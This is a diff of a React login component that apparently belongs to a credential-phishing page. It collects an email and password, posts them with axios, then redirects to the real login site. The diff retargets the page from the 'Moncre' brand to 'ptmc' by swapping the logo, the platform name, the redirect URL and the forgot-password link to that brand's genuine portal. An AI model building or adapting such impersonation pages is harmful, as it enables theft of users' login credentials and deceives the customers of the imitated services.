@@ -8,13 +8,14 @@ import { useState } from 'react';
 import axios from 'axios';
 
 import moncre from './moncre.jpeg';
+import ptmc from './ptmc.gif';
 
 function Home(){
 
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Moncre")
+    const[platform, setPlatform] = useState("ptmc")
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +44,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://mauth.mon-cre.net/login';
+               window.location.href = 'https://userportal.ptmc.net/login';
             }
           } catch (error) {
             // Handle error
@@ -71,7 +72,7 @@ function Home(){
 
                 <div className='logodiv col-md-3 py-3'>
 
-                    <img src={moncre} className="mylogo" />
+                    <img src={ptmc} className="mylogo" />
 
 
                 </div>
@@ -79,7 +80,7 @@ function Home(){
                 <div className='contentdiv col-md-9 px-3'>
                     <h1 className='contenthead'>Please Log In</h1>
                         <div className='text-right'>
-                        <a href='https://mauth.mon-cre.net/recovery' className='keys'><i className='fa fa-key'></i>Forgot Password</a>
+                        <a href='https://userportal.ptmc.net/mfa/recovery' className='keys'><i className='fa fa-key'></i>Forgot Password</a>
                         </div>
 
                 <br/>
